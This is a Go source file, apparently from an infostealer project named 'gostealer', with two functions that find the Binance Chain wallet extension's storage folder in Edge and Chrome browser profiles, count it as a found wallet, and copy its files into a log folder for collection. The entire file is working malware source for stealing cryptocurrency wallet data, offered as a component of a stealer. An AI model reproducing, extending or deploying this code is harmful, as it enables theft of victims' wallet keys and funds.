package wallets

import (
	"os"
	"path"

	"github.com/4kord/gostealer/utils"
)

func CopyBinancechainEdge(browserPath, logFolderPath string) {
	binancechainc := path.Join(browserPath, "Default", "Local Extension Settings", "fhbohimaelbohpjbbldcngcnapndodjp")

	if _, err := os.Stat(binancechainc); !os.IsNotExist(err) {
		utils.WalletAmount++
		utils.FoundWallets += "binancechain_edge_chromeversion\n"
	}

	//metamask chrome version

	utils.CopyFolderFiles(binancechainc, path.Join(logFolderPath, "wallets", "binancechain_edge_chromeversion"))
}

func CopyBinancechainChrome(browserPath, logFolderPath string) {
	binancechain := path.Join(browserPath, "Default", "Local Extension Settings", "fhbohimaelbohpjbbldcngcnapndodjp")

	if _, err := os.Stat(binancechain); !os.IsNotExist(err) {
		utils.WalletAmount++
		utils.FoundWallets += "binancechain_chrome\n"
	}
	//________________

	utils.CopyFolderFiles(binancechain, path.Join(logFolderPath, "wallets", "binancechain_chrome"))
}
